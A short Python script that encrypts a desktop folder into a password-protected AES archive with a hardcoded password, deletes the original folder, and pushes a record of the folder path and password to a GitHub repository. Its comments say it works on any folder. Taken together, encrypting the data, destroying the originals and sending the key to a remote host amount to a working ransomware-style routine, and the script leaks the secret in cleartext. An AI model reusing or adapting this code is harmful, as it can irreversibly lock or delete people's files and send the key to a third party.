import os
import shutil
import zipfile
import pyAesCrypt
from github_helper import GithubHelper
from datetime import datetime


def zip_folder_with_password(folder_path, zip_path, password):
    # Zip the folder
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, arcname=os.path.relpath(file_path, folder_path))

    # Encrypt the zip file with a password
    encrypted_zip_path = f"{zip_path}.aes"
    bufferSize = 64 * 1024
    pyAesCrypt.encryptFile(zip_path, encrypted_zip_path, password, bufferSize)

    # Remove the original zip file
    os.remove(zip_path)

    # Rename the encrypted zip file to the original zip file name
    os.rename(encrypted_zip_path, zip_path)


# For testing purposes I will zip a test folder but in reality you can zip any folder you want
folder_path = "C:\\Users\\User\\Desktop\\test"  # Specify the path of the folder to be zipped
zip_path = "C:\\Users\\User\\Desktop\\test.zip"  # Specify the path of the output zip file
password = "uiopuiop"  # Set the desired password for the zip file
zip_folder_with_password(folder_path, zip_path, password)
# Now we can remove the original folder
shutil.rmtree(folder_path)

# Make a .txt file to push to the repository that the zip file was created
github_helper = GithubHelper()
github_helper.create_file("pythontest", f"zip_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt","zipped", f"folder {folder_path} zipped with password {password}")
